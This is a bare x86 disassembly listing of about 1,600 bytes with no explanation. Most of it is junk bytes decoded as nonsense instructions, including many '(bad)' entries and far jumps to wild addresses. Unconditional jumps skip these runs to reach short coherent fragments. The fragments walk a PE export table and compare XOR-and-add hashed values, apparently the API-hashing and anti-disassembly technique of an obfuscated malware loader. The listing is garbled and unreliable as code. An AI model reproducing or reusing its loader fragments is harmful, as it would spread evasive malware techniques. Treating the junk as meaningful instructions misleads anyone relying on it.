  402ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ffb:	inc    ebx
  402ffc:	aad    0xfb
  402ffe:	or     al,0xae
  403000:	jg     0x40306d
  403002:	jae    0x402f8a
  403004:	sub    ebp,DWORD PTR [eax]
  403006:	add    al,0x41
  403008:	mov    esi,0xeb7c40fe
  40300d:	or     ecx,DWORD PTR [ecx+0x2e]
  403010:	fwait
  403011:	(bad)  
  403012:	lock dec DWORD PTR [edx+0x7741d6c8]
  403019:	cmp    al,0x3c
  40301b:	clc    
  40301c:	xchg   esi,eax
  40301d:	xchg   edi,eax
  40301e:	jae    0x402fd1
  403020:	add    eax,0x8854b82b
  403025:	aam    0x81
  403027:	rol    ecx,0x41
  40302a:	inc    esp
  40302b:	mov    fs,WORD PTR [ebx+edi*2+0x6e]
  40302f:	repz sbb cl,cl
  403032:	test   eax,0x5b217cc
  403037:	test   DWORD PTR [ebp+0x4f],0xdaec781d
  40303e:	int3   
  40303f:	inc    ebx
  403040:	pop    ebp
  403041:	in     al,0x28
  403043:	push   0x37128742
  403048:	pusha  
  403049:	mov    ah,0xb9
  40304b:	test   eax,0xd18de39d
  403050:	loop   0x4030c3
  403052:	xchg   ebp,eax
  403053:	mov    ecx,0x49dac992
  403058:	repnz iret 
  40305a:	mov    bl,0xc
  40305c:	fst    DWORD PTR [ecx+eax*2]
  40305f:	ins    BYTE PTR es:[edi],dx
  403060:	jmp    0x4030c8
  403062:	stc    
  403063:	pop    ss
  403064:	into   
  403065:	pop    edx
  403066:	(bad)  
  403067:	je     0x4030da
  403069:	cld    
  40306a:	or     BYTE PTR [eax-0x366df622],al
  403070:	cmp    BYTE PTR [esi+edi*1],cl
  403073:	jo     0x40302c
  403075:	mov    al,0x5a
  403077:	(bad)  
  403078:	out    0xe5,eax
  40307a:	adc    DWORD PTR [ebx+0x30afad01],esp
  403080:	mov    eax,DWORD PTR [ebp+0x8]
  403083:	mov    ecx,DWORD PTR [ebp-0x8]
  403086:	jmp    0x403325
  40308b:	ror    esp,1
  40308d:	ror    edx,1
  40308f:	ror    ecx,1
  403091:	(bad)  
  403093:	test   al,0x59
  403095:	xchg   ebx,eax
  403096:	push   edx
  403097:	mov    bl,0xc5
  403099:	xchg   ebx,eax
  40309a:	inc    eax
  40309b:	xchg   edx,eax
  40309c:	adc    eax,0x7efe7878
  4030a1:	js     0x40311b
  4030a3:	loopne 0x4030cb
  4030a5:	mov    dl,0x33
  4030a7:	mov    ebp,0xadef7252
  4030ac:	aad    0xef
  4030ae:	lock push esp
  4030b0:	and    DWORD PTR [eax-0xe299961],edx
  4030b6:	adc    ebp,DWORD PTR [edi]
  4030b8:	xlat   BYTE PTR ds:[ebx]
  4030b9:	ds sub esp,edx
  4030bc:	in     eax,dx
  4030bd:	and    ah,BYTE PTR [edx-0x41109504]
  4030c3:	scas   al,BYTE PTR es:[edi]
  4030c4:	repz in eax,0xc6
  4030c7:	dec    BYTE PTR [edx+0x21]
  4030ca:	ins    DWORD PTR es:[edi],dx
  4030cb:	ins    DWORD PTR es:[edi],dx
  4030cc:	div    BYTE PTR [ecx]
  4030ce:	lds    ebp,FWORD PTR [edi+ebp*1+0xc]
  4030d2:	mov    edx,0xdede2ddc
  4030d7:	sbb    ebp,edi
  4030d9:	(bad)  
  4030da:	xor    esp,DWORD PTR [edi+0x5419c039]
  4030e0:	mov    ecx,0x5fce8abc
  4030e5:	mov    bh,0x2e
  4030e7:	dec    edx
  4030e8:	and    ebp,ebx
  4030ea:	(bad)  
  4030eb:	pop    esp
  4030ec:	les    ebp,FWORD PTR [ebp-0x6b]
  4030ef:	dec    esp
  4030f0:	dec    ebp
  4030f1:	retf   
  4030f2:	jmp    0x335b38b6
  4030f7:	jne    0x40313a
  4030f9:	cld    
  4030fa:	mov    esi,0x89454ae6
  4030ff:	mov    eax,ds:0x54bd69eb
  403104:	push   ds
  403105:	cmp    BYTE PTR [eax],cl
  403107:	sbb    DWORD PTR [ebx+eiz*2+0x53bae0ed],esi
  40310e:	imul   DWORD PTR [eax+0x44]
  403111:	daa    
  403112:	popa   
  403113:	pop    ss
  403114:	xchg   DWORD PTR [esi],edi
  403116:	sbb    ebx,DWORD PTR [esi+eiz*1-0x7d76bf5c]
  40311d:	mov    ds:0xdc791fb,eax
  403122:	ds jmp 0x4030b1
  403125:	(bad)  
  403126:	xlat   BYTE PTR ds:[ebx]
  403127:	mov    gs,ebx
  403129:	(bad)  
  40312a:	ficom  DWORD PTR [edx]
  40312c:	into   
  40312d:	(bad)  
  40312e:	xchg   ecx,eax
  40312f:	inc    esi
  403130:	or     DWORD PTR [esi],ecx
  403132:	fild   WORD PTR [eax]
  403134:	xchg   esi,eax
  403135:	xor    DWORD PTR [eax],eax
  403137:	out    dx,eax
  403138:	mov    ds:0x686e9fa0,eax
  40313d:	xchg   esi,eax
  40313e:	cld    
  40313f:	in     al,0x5c
  403141:	loopne 0x403138
  403143:	mov    bl,BYTE PTR [eax]
  403145:	cmp    edi,DWORD PTR [ebp-0x429136f]
  40314b:	jmp    0xa59f226
  403150:	and    al,0xd2
  403152:	push   0xffffffb3
  403154:	iret   
  403155:	daa    
  403156:	push   ecx
  403157:	cmp    dl,ch
  403159:	sub    ebp,edi
  40315b:	pushf  
  40315c:	into   
  40315d:	pushf  
  40315e:	xor    BYTE PTR es:[ebp+0x11],ah
  403162:	mov    ecx,DWORD PTR [esi+0x17]
  403165:	sub    BYTE PTR [ebx-0x3385afd8],cl
  40316b:	sahf   
  40316c:	cdq    
  40316d:	cmp    DWORD PTR [esi],eax
  40316f:	push   ss
  403170:	popf   
  403171:	outs   dx,DWORD PTR ds:[esi]
  403172:	std    
  403173:	add    esi,esi
  403175:	jno    0x4031c3
  403177:	aad    0xc
  403179:	mov    BYTE PTR [ecx+ebx*1],ch
  40317c:	sbb    eax,0xfd4ca463
  403181:	fist   WORD PTR [ecx-0x1d]
  403184:	stos   BYTE PTR es:[edi],al
  403185:	adc    eax,0x6730d7bd
  40318a:	or     eax,0x347b77ba
  40318f:	stos   BYTE PTR es:[edi],al
  403190:	jmp    0x561f9d56
  403195:	inc    DWORD PTR [ecx+0x6fd44fcf]
  40319b:	mov    ds:0x72798a5f,al
  4031a0:	cld    
  4031a1:	dec    ecx
  4031a2:	and    ecx,DWORD PTR [ebx]
  4031a4:	mov    ebp,0x2b639e9b
  4031a9:	add    eax,0xd9349d2b
  4031ae:	fs push ecx
  4031b0:	adc    edi,DWORD PTR ds:0xa2a26f05
  4031b6:	jmp    0x2938:0x15e295b0
  4031bd:	or     DWORD PTR [ebx+esi*8+0x4312303d],eax
  4031c4:	repz xor dl,bh
  4031c7:	out    dx,al
  4031c8:	xlat   BYTE PTR ds:[ebx]
  4031c9:	jns    0x403203
  4031cb:	cmp    ebp,ecx
  4031cd:	pop    eax
  4031ce:	mov    eax,esp
  4031d0:	mov    al,ds:0x10e2ef9e
  4031d5:	add    bh,BYTE PTR [ebp-0x1]
  4031d8:	add    esp,DWORD PTR [edx+0x72a5fc94]
  4031de:	rcl    BYTE PTR [ecx+ebx*1],cl
  4031e1:	popf   
  4031e2:	aaa    
  4031e3:	in     eax,dx
  4031e4:	and    edi,ebx
  4031e6:	jnp    0x40321a
  4031e8:	dec    eax
  4031e9:	pop    ebp
  4031ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031eb:	dec    edx
  4031ec:	and    eax,0x26999786
  4031f1:	lds    edx,FWORD PTR [ecx]
  4031f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031f4:	adc    ecx,ebx
  4031f6:	fisttp WORD PTR [ecx+0x23c8f87e]
  4031fc:	scas   eax,DWORD PTR es:[edi]
  4031fd:	and    ebx,DWORD PTR [edi]
  4031ff:	xchg   ebx,eax
  403200:	test   eax,0x7e6e7213
  403205:	xchg   ebx,eax
  403206:	jne    0x40326c
  403208:	lahf   
  403209:	or     dl,BYTE PTR [ebp-0x58695cee]
  40320f:	mov    dh,0xdf
  403211:	push   ss
  403212:	aad    0x7b
  403214:	ret    
  403215:	pop    ecx
  403216:	adc    ebx,edi
  403218:	push   esp
  403219:	leave  
  40321a:	sbb    al,0x63
  40321c:	jge    0x4031a1
  40321e:	push   edi
  40321f:	adc    eax,0xd1ff634
  403224:	idiv   BYTE PTR [edi+0x6e3fe419]
  40322a:	mov    ds:0x89295b6f,al
  40322f:	clc    
  403230:	mov    esp,0x6d98a402
  403235:	xlat   BYTE PTR ds:[ebx]
  403236:	add    ecx,DWORD PTR [eax-0x23]
  403239:	mov    bl,0x71
  40323b:	xchg   BYTE PTR [eax-0x22],bl
  40323e:	or     eax,0xb8b6c1c1
  403243:	sar    BYTE PTR [ebx],1
  403245:	mov    esi,DWORD PTR [ebx]
  403247:	xchg   ebx,eax
  403248:	pop    es
  403249:	sbb    DWORD PTR [esi],edi
  40324b:	or     ebp,DWORD PTR [ecx+0xad76336]
  403251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403252:	xchg   BYTE PTR [ecx-0x60],al
  403255:	push   es
  403256:	test   ebp,eax
  403258:	inc    esi
  403259:	sub    DWORD PTR [ecx-0x7b5f743a],0xad205571
  403263:	into   
  403264:	addr16 jmp 0xb42d0cdf
  40326a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40326b:	jno    0x40324b
  40326d:	mov    BYTE PTR [ebp+0x32],al
  403270:	call   esp
  403272:	loopne 0x4032f1
  403274:	out    dx,al
  403275:	jmp    0x524fd64c
  40327a:	mov    ds:0x78fa062e,eax
  40327f:	aas    
  403280:	outs   dx,DWORD PTR ds:[esi]
  403281:	xchg   ebp,eax
  403282:	xchg   edx,eax
  403283:	lock popf 
  403285:	mov    WORD PTR [esi+edx*2+0x1f],?
  403289:	das    
  40328a:	inc    edx
  40328b:	mov    dl,0xb5
  40328d:	leave  
  40328e:	sti    
  40328f:	mov    esi,0x8b8f1ff1
  403294:	imul   DWORD PTR [ebx+0x69]
  403297:	mov    cs,WORD PTR [ebx]
  403299:	cmp    BYTE PTR [ebx+0x2a1a77bb],dh
  40329f:	and    al,0x54
  4032a1:	push   ss
  4032a2:	adc    BYTE PTR [eax],0xe4
  4032a5:	(bad)
  4032a8:	call   FWORD PTR [eax+0x5b]
  4032ab:	aaa    
  4032ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ad:	(bad)  
  4032ae:	rcr    bl,1
  4032b0:	and    BYTE PTR [ecx+0x1f],al
  4032b3:	adc    cl,BYTE PTR [esi+0x6f48b71d]
  4032b9:	int3   
  4032ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032bb:	dec    esp
  4032bc:	ror    BYTE PTR [ebx+0x3a44a752],0x72
  4032c3:	pop    ecx
  4032c4:	inc    ebx
  4032c5:	pop    esi
  4032c6:	outs   dx,BYTE PTR ds:[esi]
  4032c7:	and    al,cl
  4032c9:	jne    0x4032ca
  4032cb:	sar    BYTE PTR [ebp-0xd],1
  4032ce:	xchg   ebp,eax
  4032cf:	pop    edi
  4032d0:	jb     0x403298
  4032d2:	or     BYTE PTR [edx],dl
  4032d4:	out    0xf,al
  4032d6:	jae    0x40327e
  4032d8:	jmp    0x631003b0
  4032dd:	dec    ebp
  4032de:	mov    ah,0x65
  4032e0:	xor    DWORD PTR [ebx],esp
  4032e2:	call   0x7e37d222
  4032e7:	adc    eax,0xaadf40aa
  4032ec:	xor    DWORD PTR [esi],esp
  4032ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ef:	mov    bl,0x2
  4032f1:	or     ecx,esi
  4032f3:	mov    dl,0xb5
  4032f5:	out    dx,eax
  4032f6:	sub    esp,ebp
  4032f8:	imul   edx,DWORD PTR ds:0x9def8dc8,0x397994cb
  403302:	gs stc 
  403304:	inc    esp
  403305:	sti    
  403306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403307:	mov    edi,0xddaa8f10
  40330c:	push   ecx
  40330d:	push   esp
  40330e:	lods   al,BYTE PTR ds:[esi]
  40330f:	xchg   esp,eax
  403310:	addr16 or ch,dh
  403313:	jmp    0x40338d
  403315:	loopne 0x40336f
  403317:	xchg   ecx,eax
  403318:	ins    BYTE PTR es:[edi],dx
  403319:	or     bl,bl
  40331b:	imul   eax,esp,0xdb0d83ff
  403321:	stc    
  403322:	dec    edx
  403323:	retf   
  403324:	(bad)  
  403325:	xor    eax,esi
  403327:	add    eax,edi
  403329:	cmp    DWORD PTR [ecx],eax
  40332b:	je     0x4040c9
  403331:	mov    ecx,DWORD PTR [ebp-0x14]
  403334:	mov    eax,DWORD PTR [ebp-0x8]
  403337:	mov    eax,DWORD PTR [eax]
  403339:	mov    eax,DWORD PTR [eax+0x3c]
  40333c:	lea    ecx,[ecx*8+0x78]
  403343:	add    eax,ecx
  403345:	mov    ecx,DWORD PTR [ebp-0x8]
  403348:	mov    ecx,DWORD PTR [ecx]
  40334a:	mov    eax,DWORD PTR [eax+ecx*1]
  40334d:	mov    DWORD PTR [ebp-0x1c],eax
  403350:	mov    eax,DWORD PTR [ebp+0x8]
  403353:	xor    eax,esi
  403355:	add    eax,edi
  403357:	mov    DWORD PTR [ebp-0x20],eax
  40335a:	mov    eax,DWORD PTR [ebp+0x8]
  40335d:	mov    ecx,DWORD PTR [ebp-0x1c]
  403360:	jmp    0x4035ff
  403365:	(bad)  
  403366:	cmp    al,0xcf
  403368:	cmp    al,0xd9
  40336a:	rcr    ecx,cl
  40336c:	fidiv  DWORD PTR [ecx+0x10c23cb6]
  403372:	cmp    eax,0x1a10377b
  403377:	js     0x4033f1
  403379:	(bad)  
  40337a:	jle    0x4033f4
  40337c:	js     0x4033c3
  40337e:	fidiv  WORD PTR [edx-0x7f0a995d]
  403384:	dec    edi
  403385:	vpmadcsswd ymm10,ymm7,ymm6,YMMWORD PTR [ebp+0x6e]
  40338c:	pop    ecx
  40338d:	daa    
  40338e:	nop
  40338f:	sub    cl,BYTE PTR [ebx+0x32]
  403392:	mov    ch,BYTE PTR [edx+0x74cedf11]
  403398:	mov    al,0xdf
  40339a:	hlt    
  40339b:	mov    ebx,0x7af49b4b
  4033a0:	icebp  
  4033a1:	sbb    al,BYTE PTR [ebx]
  4033a3:	in     eax,0xff
  4033a5:	cmp    DWORD PTR [ecx-0xd16acfa],edi
  4033ab:	or     esi,0x6c
  4033ae:	shl    DWORD PTR [eax+0x59ce97b3],1
  4033b4:	mov    bl,BYTE PTR ds:0x73f5b2f1
  4033ba:	inc    ebp
  4033bb:	jb     0x403394
  4033bd:	sbb    eax,0x7eb03929
  4033c2:	adc    DWORD PTR [esi-0x2966e621],eax
  4033c8:	scas   eax,DWORD PTR es:[edi]
  4033c9:	xchg   edx,eax
  4033ca:	add    DWORD PTR [edx-0x32826c26],ebx
  4033d0:	adc    DWORD PTR [edx-0x24],edi
  4033d3:	jp     0x403433
  4033d5:	add    ebx,edi
  4033d7:	jbe    0x4033bc
  4033d9:	call   0xd74f8a8c
  4033de:	sub    esp,esi
  4033e0:	jmp    0x403409
  4033e2:	call   FWORD PTR [ebx-0x5e]
  4033e5:	jp     0x40340e
  4033e7:	sbb    al,0xf0
  4033e9:	mov    ah,0xf2
  4033eb:	dec    edx
  4033ec:	or     dh,bh
  4033ee:	mov    ah,0x39
  4033f0:	inc    ebx
  4033f1:	or     DWORD PTR [edi],esi
  4033f3:	pop    edx
  4033f4:	add    al,0x9a
  4033f6:	pop    edx
  4033f7:	adc    BYTE PTR [ebx+0x69797598],al
  4033fd:	aas    
  4033fe:	mov    al,0xdb
  403400:	gs loop 0x4033e8
  403403:	inc    ebp
  403404:	jo     0x40346e
  403406:	ret    0x9852
  403409:	mov    ch,0x2e
  40340b:	iret   
  40340c:	cwde   
  40340d:	mov    edx,0xda78dc10
  403412:	call   0xee70eaa0
  403417:	aad    0xbe
  403419:	mov    ebx,0x9543898a
  40341e:	mov    al,ds:0xd4650a78
  403423:	into   
  403424:	lds    esi,FWORD PTR [ebp-0x161d4458]
  40342a:	std    
  40342b:	xor    bl,BYTE PTR [ebp+ebx*4-0x2ab6ce8a]
  403432:	sti    
  403433:	xor    DWORD PTR [edx],edx
  403435:	test   DWORD PTR [edx],esi
  403437:	(bad)  
  403438:	sub    al,0xa5
  40343a:	icebp  
  40343b:	shr    DWORD PTR [eax],1
  40343d:	outs   dx,BYTE PTR ds:[esi]
  40343e:	daa    
  40343f:	fwait
  403440:	mov    DWORD PTR [ebx-0x11],edx
  403443:	ins    BYTE PTR es:[edi],dx
  403444:	out    dx,al
  403445:	sub    ebp,DWORD PTR [ecx-0x79988698]
  40344b:	inc    ebp
  40344c:	scas   eax,DWORD PTR es:[edi]
  40344d:	xchg   ebp,eax
  40344e:	sub    BYTE PTR [edi+0x26],bh
  403451:	sbb    eax,0x59e57cd6
  403456:	pop    edx
  403457:	pop    esi
  403458:	and    al,0xcb
  40345a:	(bad)  
  40345b:	sbb    ecx,DWORD PTR [edi+0x24]
  40345e:	mov    dl,0x73
  403460:	jl     0x40347c
  403462:	scas   al,BYTE PTR es:[edi]
  403463:	fiadd  DWORD PTR [esi+eax*4+0x6ed581fb]
  40346a:	xchg   edx,eax
  40346b:	jl     0x403428
  40346d:	pop    ds
  40346e:	and    ecx,DWORD PTR [ecx-0x49]
  403471:	aam    0x4e
  403473:	inc    eax
  403474:	test   al,0x2d
  403476:	jb     0x403422
  403478:	sbb    al,0x76
  40347a:	dec    ebx
  40347b:	cmp    al,0xd1
  40347d:	test   dh,ah
  40347f:	push   eax
  403480:	call   0x9de64d9d
  403485:	call   0x8804:0xf089ca10
  40348c:	push   eax
  40348d:	adc    eax,0x2a738232
  403492:	popa   
  403493:	adc    DWORD PTR [ebx-0x7f],0xb010a211
  40349a:	xchg   DWORD PTR [edx],esi
  40349c:	xchg   esp,eax
  40349d:	adc    al,0x1e
  40349f:	stc    
  4034a0:	aaa    
  4034a1:	push   ebx
  4034a2:	out    0x5d,eax
  4034a4:	pop    edx
  4034a5:	dec    edi
  4034a6:	sti    
  4034a7:	fcom   DWORD PTR ds:0x1c3d33c9
  4034ae:	sub    BYTE PTR [eax+0x3ad6448a],ah
  4034b4:	hlt    
  4034b5:	push   0x64
  4034b7:	lods   eax,DWORD PTR ds:[esi]
  4034b8:	mov    esi,0xba20a085
  4034bd:	loop   0x4034b1
  4034bf:	hlt    
  4034c0:	inc    eax
  4034c1:	pop    edx
  4034c2:	or     BYTE PTR [ebx-0x65],dh
  4034c5:	xchg   edx,eax
  4034c6:	cmp    al,0x95
  4034c8:	icebp  
  4034c9:	scas   al,BYTE PTR es:[edi]
  4034ca:	lds    esi,FWORD PTR [edx]
  4034cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034cd:	pop    ds
  4034ce:	stos   BYTE PTR es:[di],al
  4034d0:	lods   al,BYTE PTR ds:[esi]
  4034d1:	shl    DWORD PTR [eax-0x3be3b777],0x8d
  4034d8:	imul   edi,DWORD PTR gs:[edx],0x5e4a0310
  4034df:	stos   DWORD PTR es:[edi],eax
  4034e0:	or     al,0x2f
  4034e2:	ss push esp
  4034e4:	inc    ecx
  4034e5:	sbb    eax,0x69f42c8a
  4034ea:	or     edi,DWORD PTR [edx-0xe5dd33e]
  4034f0:	ins    BYTE PTR es:[edi],dx
  4034f1:	cmp    DWORD PTR [eax+0x43],esp
  4034f4:	test   eax,0x6d547d07
  4034f9:	aam    0xe9
  4034fb:	lahf   
  4034fc:	lock adc al,0x85
  4034ff:	and    eax,0x9d2ae390
  403504:	ret    
  403505:	push   edx
  403506:	push   ecx
  403507:	ins    BYTE PTR es:[edi],dx
  403508:	or     cl,BYTE PTR [edx+edx*2-0x4a]
  40350c:	cmp    DWORD PTR [ebx-0x5e],0xa3b8a749
  403513:	leave  
  403514:	xchg   ebp,eax
  403515:	cli    
  403516:	das    
  403517:	repnz sub al,0x6f
  40351a:	pop    edi
  40351b:	(bad)  
  40351d:	sahf   
  40351e:	and    DWORD PTR [eax+0x59],ebp
  403521:	jg     0x4035a0
  403523:	out    0x62,al
  403525:	pop    ebp
  403526:	pop    edi
  403527:	mov    ds:0x24e6568b,eax
  40352c:	loopne 0x403568
  40352e:	ror    DWORD PTR [edx],cl
  403530:	int3   
  403531:	mov    ebx,0x1d3ef8d8
  403536:	jo     0x403513
  403538:	xor    edi,edi
  40353a:	out    dx,eax
  40353b:	fld    DWORD PTR [ebx]
  40353d:	adc    eax,DWORD PTR [ecx+0x576009aa]
  403543:	ss in  al,dx
  403545:	out    dx,al
  403546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403547:	ret    0xf7c1
  40354a:	rcr    DWORD PTR [esi+0xaf623a3],1
  403550:	mov    al,ds:0xa409aae4
  403555:	(bad)  
  403556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403557:	cs cmp al,0xe5
  40355a:	mov    ch,0x2f
  40355c:	add    BYTE PTR [eax],cl
  40355e:	in     al,dx
  40355f:	ins    BYTE PTR es:[edi],dx
  403560:	or     dh,BYTE PTR [esi+0x16e144a2]
  403566:	and    esi,edx
  403568:	inc    ecx
  403569:	loop   0x4035d5
  40356b:	dec    ebx
  40356c:	jl     0x403585
  40356e:	mov    DWORD PTR [ebp+0x65910685],esi
  403574:	je     0x403578
  403576:	repnz nop
  403578:	adc    esi,edi
  40357a:	into   
  40357b:	or     eax,0x4f8ac7ac
  403580:	(bad)  
  403581:	mov    eax,0xa7f039cc
  403586:	xchg   ebp,eax
  403587:	cmp    BYTE PTR [di+0x3268],bh
  40358c:	fld    st(2)
  40358e:	lods   eax,DWORD PTR ds:[esi]
  40358f:	inc    ebp
  403590:	loopne 0x4035d9
  403592:	dec    esp
  403593:	mov    WORD PTR [ecx+0x1304397e],ds
  403599:	sbb    eax,ecx
  40359b:	jle    0x40354b
  40359d:	sbb    DWORD PTR ds:0x83c6b351,esp
  4035a3:	repz rcl ebx,0x27
  4035a7:	les    esi,FWORD PTR [ebp+0x41]
  4035aa:	adc    DWORD PTR [edi+0x79],esp
  4035ad:	inc    esp
  4035ae:	arpl   WORD PTR [ebp-0x26],bx
  4035b1:	out    dx,al
  4035b2:	adc    DWORD PTR [esi],edx
  4035b4:	pop    es
  4035b5:	sub    edx,DWORD PTR [eax]
  4035b7:	and    BYTE PTR [edi-0x21],ah
  4035ba:	or     DWORD PTR [ebp+0x49e2ed36],esi
  4035c0:	dec    edx
  4035c1:	out    dx,eax
  4035c2:	pop    es
  4035c3:	mov    eax,ds:0x4bb59735
  4035c8:	fs (bad) 
  4035ca:	sahf   
  4035cb:	daa    
  4035cc:	or     ah,cl
  4035ce:	inc    esi
  4035cf:	mov    al,0x82
  4035d1:	sahf   
  4035d2:	in     al,0x26
  4035d4:	and    DWORD PTR [esp+edi*2],0x6a
  4035d8:	jmp    0xdd8b:0x353e11c6
  4035df:	retw   
  4035e1:	aaa    
  4035e2:	or     DWORD PTR [esi-0x60b86367],esi
  4035e8:	inc    eax
  4035e9:	pop    ds
  4035ea:	fstp   DWORD PTR [ecx-0x41fc845f]
  4035f0:	xor    ebp,0xfffffff4
  4035f3:	cdq    
  4035f4:	dec    eax
  4035f5:	cdq    
  4035f6:	shl    DWORD PTR [ebp+0x48453647],cl
  4035fc:	lea    ecx,[esi+0x7b]
  4035ff:	xor    eax,esi
  403601:	add    eax,edi
  403603:	cmp    ecx,eax
  403605:	je     0x404380
  40360b:	mov    eax,DWORD PTR [ebp-0x8]
  40360e:	mov    ecx,DWORD PTR [ebp-0x1c]
  403611:	add    ecx,DWORD PTR [eax]
  403613:	mov    DWORD PTR [ebp-0x20],ecx
  403616:	mov    eax,DWORD PTR [ebp-0x20]
  403619:	mov    ecx,DWORD PTR [ebp-0x8]
  40361c:	mov    eax,DWORD PTR [eax+0xc]
  40361f:	mov    ecx,DWORD PTR [ecx]
  403621:	jmp    0x4038c0
  403626:	xlat   BYTE PTR ds:[ebx]
  403627:	aas    
  403628:	mov    al,0xd6
  40362b:	(bad)
  40362e:	fwait
  40362f:	clc    
  403630:	mov    BYTE PTR ds:0xd60effaf,0x96
  403637:	sbb    BYTE PTR [eax+0x78],bh
  40363a:	(bad)  
  40363b:	jle    0x4036b5
  40363d:	js     0x4035ee
  40363f:	test   eax,0x615bcd40
  403644:	xlat   BYTE PTR ds:[ebx]
  403645:	(bad)
  403648:	lods   al,BYTE PTR ds:[esi]
  403649:	sbb    BYTE PTR [esi-0x6b],dl
  40364c:	repnz fdivr st(4),st
  40364f:	fstcw  WORD PTR ds:0x7e5418c2
  403656:	dec    esi
  403657:	ins    BYTE PTR es:[edi],dx
  403658:	mov    eax,0x8f2bf175
  40365d:	fsub   st(5),st
  40365f:	sbb    esp,DWORD PTR [ebx-0x1530664c]
  403665:	inc    eax
  403666:	int    0x20
  403668:	call   0xad7c:0x6265acea
  40366f:	sbb    ebp,DWORD PTR [eax]
  403671:	inc    esi
  403672:	sub    eax,0x365885c3
  403677:	(bad)  
  403678:	hlt    
  403679:	std    
  40367a:	ret    0xc4a7
  40367d:	adc    BYTE PTR [ebx+0x3b],ch
  403680:	and    eax,0x6ebaf062
  403685:	push   edi
  403686:	and    ah,BYTE PTR [ebx+0x7]
  403689:	inc    edi
  40368a:	popf   
  40368b:	sub    ch,BYTE PTR [esi]
  40368d:	or     al,0x5
  40368f:	jmp    FWORD PTR [ebp+0x14]
  403692:	das    
  403693:	adc    DWORD PTR [edx+0xb04691d],edx
  403699:	les    edi,FWORD PTR [ecx+0x254325fa]
  40369f:	les    ebp,FWORD PTR [ebp+eiz*1+0x3374ea5b]
  4036a6:	popa   
  4036a7:	popf   
  4036a8:	mov    dl,0x60
  4036aa:	loop   0x4036fc
  4036ac:	sbb    BYTE PTR [ebx],bl
  4036ae:	jns    0x403656
  4036b0:	jnp    0x403678
  4036b2:	imul   esp,DWORD PTR [eax+edi*1],0xffffffaf
  4036b6:	dec    esi
  4036b7:	xor    eax,0xbd0c6bda
  4036bc:	add    al,0xbc
  4036be:	jne    0x4036f5
  4036c0:	xor    al,0xe4
  4036c2:	hlt    
  4036c3:	and    DWORD PTR [ebx+0x41],esi
  4036c6:	xor    ch,BYTE PTR [edx]
  4036c8:	rcl    DWORD PTR [edx-0x80],cl
  4036cb:	fisttp DWORD PTR [ebx-0x1b]
  4036ce:	cmp    ah,0x74
  4036d1:	mov    dl,0xf
  4036d3:	pop    esp
  4036d4:	data16 into 
  4036d6:	sub    eax,0xff579ba3
  4036db:	fnstenv [ebp+eiz*4+0x2]
  4036df:	ds push cs
  4036e1:	and    DWORD PTR [edi],ecx
  4036e3:	adc    edx,eax
  4036e5:	push   0xb23fba63
  4036ea:	int    0x47
  4036ec:	pop    ds
  4036ed:	xor    dl,cl
  4036ef:	adc    edi,DWORD PTR [ebx+0x3c33e091]
  4036f5:	cmp    DWORD PTR [ebx+ebp*2+0x0],ebp
  4036f9:	cli    
  4036fa:	stc    
  4036fb:	cwde   
  4036fc:	adc    eax,0x4f83bcd3
  403701:	xchg   edx,eax
  403702:	mov    cl,0xa5
  403704:	jecxz  0x403753
  403706:	xor    DWORD PTR [ecx-0x2e68ed21],esp
  40370c:	add    eax,0xc4ca5271
  403711:	fadd   QWORD PTR [edx-0x5f]
  403714:	mov    ecx,0x334da0dd
  403719:	add    dl,BYTE PTR [edi-0x42]
  40371c:	fdivp  st(4),st
  40371e:	cwde   
  40371f:	idiv   BYTE PTR [ebp+0x4c093968]
  403725:	dec    DWORD PTR [eax+0x77]
  403728:	add    eax,0x661c34bc
  40372d:	shl    DWORD PTR [edx-0x29],1
  403730:	jne    0x403753
  403732:	das    
  403733:	sti    
  403734:	in     eax,0x7d
  403736:	push   0xffffffdb
  403738:	mov    ds:0x3ef802cb,al
  40373d:	iret   
  40373e:	scas   eax,DWORD PTR es:[edi]
  40373f:	imul   eax,ebx,0x5b
  403742:	cld    
  403743:	pop    ecx
  403744:	fisubr WORD PTR [ebx+edi*2]
  403747:	mov    dl,0x5e
  403749:	aad    0x16
  40374b:	mov    ebp,0x507d3882
  403750:	xchg   edi,eax
  403751:	outs   dx,BYTE PTR ds:[esi]
  403752:	mov    dh,0x13
  403754:	popa   
  403755:	adc    edi,DWORD PTR [ebx-0x46]
  403758:	stos   BYTE PTR es:[edi],al
  403759:	(bad)  
  40375a:	fist   WORD PTR [eax]
  40375c:	sbb    BYTE PTR [ebp+0x394cdb35],bl
  403762:	sar    DWORD PTR [edx+edi*2+0x1538725a],0x51
  40376a:	xlat   BYTE PTR ds:[ebx]
  40376b:	fisub  DWORD PTR [edi+0x65]
  40376e:	adc    DWORD PTR [eax],ebx
  403770:	add    BYTE PTR [edi],dl
  403772:	add    esp,DWORD PTR [ebx+0x2697c3e8]
  403778:	inc    eax
  403779:	push   0x31e7c333
  40377e:	adc    BYTE PTR [ebx+0x28b2dca],bl
  403784:	mov    dl,0x6b
  403786:	icebp  
  403787:	xchg   esi,eax
  403788:	shl    BYTE PTR [ecx-0x7ce4acc6],cl
  40378e:	sub    eax,DWORD PTR [ebx]
  403790:	fsub   QWORD PTR [eax]
  403792:	mov    eax,ds:0x786bd759
  403797:	mov    eax,0xdbcdfae3
  40379c:	mov    esp,DWORD PTR [edi]
  40379e:	mov    ch,0x7a
  4037a0:	pop    edx
  4037a1:	icebp  
  4037a2:	aad    0x77
  4037a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037a5:	hlt    
  4037a6:	xchg   edx,eax
  4037a7:	jb     0x403827
  4037a9:	lods   al,BYTE PTR ds:[esi]
  4037aa:	xor    BYTE PTR ds:0x8e2b14c6,0x5b
  4037b1:	adc    ebp,edi
  4037b3:	mov    edi,0xef93576e
  4037b8:	in     eax,0xea
